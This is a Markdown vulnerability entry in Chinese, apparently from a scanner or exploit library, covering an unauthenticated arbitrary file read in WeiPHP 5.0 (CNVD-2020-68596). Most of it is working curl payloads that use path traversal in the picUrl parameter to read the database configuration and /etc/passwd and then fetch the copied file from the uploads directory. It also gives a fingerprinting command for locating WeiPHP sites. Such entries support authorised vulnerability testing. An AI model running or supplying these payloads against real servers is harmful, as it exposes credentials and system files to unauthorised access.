---
id: WEIPHP-FILE-READ
title: WeiPHP 5.0 前台任意文件读取漏洞 (CNVD-2020-68596)
product: weiphp
vendor: WeiPHP
version_affected: "<= 5.0"
severity: HIGH
tags: [file_read, 无需认证, 国产]
fingerprint: ["WeiPHP", "weiphp"]
---

## 漏洞描述

WeiPHP 5.0 及以前版本的 `_download_imgage` 方法存在前台任意文件读取漏洞。`picUrl` 参数的值被直接传入 `wp_file_get_contents()` 读取文件内容并保存为 jpg 文件到 uploads 目录，攻击者可读取服务器上的任意文件（包括数据库配置等敏感文件）。

## 影响版本

- WeiPHP <= 5.0

## 前置条件

- 无需认证

## 利用步骤

1. 向 `_download_imgage` 接口传入目标文件路径
2. 系统将文件内容保存为 jpg 到 uploads 目录
3. 访问保存的 jpg 文件获取内容

## Payload

### 读取数据库配置

```bash
# 触发文件读取
curl -s "http://target/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=/../../../application/database.php"

# 访问保存的文件（从上传目录获取）
curl -s "http://target/public/uploads/picture/$(date +%Y-%m-%d)/" | grep ".jpg"
```

### 读取 /etc/passwd

```bash
curl -s "http://target/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=/../../../../../../../etc/passwd"
```

## 验证方法

```bash
# 触发读取后检查 uploads 目录
curl -s "http://target/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=/../../../application/database.php" -o /dev/null -w "%{http_code}"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "WeiPHP\|weiphp"
```

## 参考链接

- https://www.cnvd.org.cn/flaw/show/CNVD-2020-68596
